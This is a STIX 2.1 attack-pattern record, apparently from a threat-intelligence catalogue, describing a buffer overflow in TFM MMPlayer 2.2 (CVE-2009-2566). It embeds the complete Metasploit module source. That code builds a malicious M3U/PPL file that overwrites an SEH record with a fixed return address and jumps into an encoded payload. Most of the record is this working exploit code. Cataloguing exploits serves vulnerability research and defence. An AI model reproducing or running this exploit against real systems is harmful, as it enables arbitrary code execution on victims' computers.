{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c60e3b86-3049-421a-b9ff-77c32458b432",
    "created": "2024-08-14T16:36:02.733271Z",
    "modified": "2024-08-14T16:36:02.733275Z",
    "name": "TFM MMPlayer (m3u/ppl File) Buffer Overflow",
    "description": " This module exploits a buffer overflow in MMPlayer 2.2 The vulnerability is triggered when opening a malformed M3U/PPL file that contains an overly long string, which results in overwriting a SEH record, thus allowing arbitrary code execution under the context of the user.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/tfm_mmplayer_m3u_ppl_bof.rb",
            "external_id": "tfm_mmplayer_m3u_ppl_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-2566"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'TFM MMPlayer (m3u/ppl File) Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a buffer overflow in MMPlayer 2.2\n        The vulnerability is triggered when opening a malformed M3U/PPL file\n        that contains an overly long string, which results in overwriting a\n        SEH record, thus allowing arbitrary code execution under the context\n        of the user.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'RjRjh Hack3r',                        # Original discovery and exploit\n          'bcoles'  # msf exploit\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2009-2566' ],\n          [ 'OSVDB', '80532' ],\n          [ 'BID', '52698' ],\n          [ 'EDB', '18656' ], # .m3u\n          [ 'EDB', '18657' ]  # .ppl\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # Tested on:\n          # Windows XP Pro SP3 - English\n          # Windows Vista SP1 - English\n          # Windows 7 Home Basic SP0 - English\n          # Windows 7 Ultimate SP1 - English\n          # Windows Server 2003 Enterprise SP2 - English\n          [ 'Windows Universal', { 'Ret' => 0x00401390 } ], # p/p/r -> MMPlayer.exe\n        ],\n      'Payload'        =>\n        {\n          'Size' => 4000,\n          'BadChars' => \"\\x00\\x0a\\x0d\",\n          'DisableNops' => false\n        },\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-03-23',\n      'DefaultTarget'  => 0\n    ))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ true, 'The file name.', 'msf.ppl'])\n      ])\n\n  end\n\n  def exploit\n\n    nops   = make_nops(10)\n    sc     = payload.encoded\n    offset = Rex::Text.rand_text_alphanumeric(4103 - sc.length - nops.length)\n    jmp    = Rex::Arch::X86.jmp(-4108)            # near jump 4103 bytes\n    nseh   = Rex::Arch::X86.jmp_short(-7)         # jmp back 7 bytes\n    nseh  << Rex::Text.rand_text_alphanumeric(2)\n    seh    = [target.ret].pack('V')\n\n    sploit  = nops\n    sploit << sc\n    sploit << offset\n    sploit << jmp\n    sploit << nseh\n    sploit << seh\n\n    # write file\n    file_create(sploit)\n\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2012-03-23",
    "x_mitre_platforms": [
        "win'"
    ]
}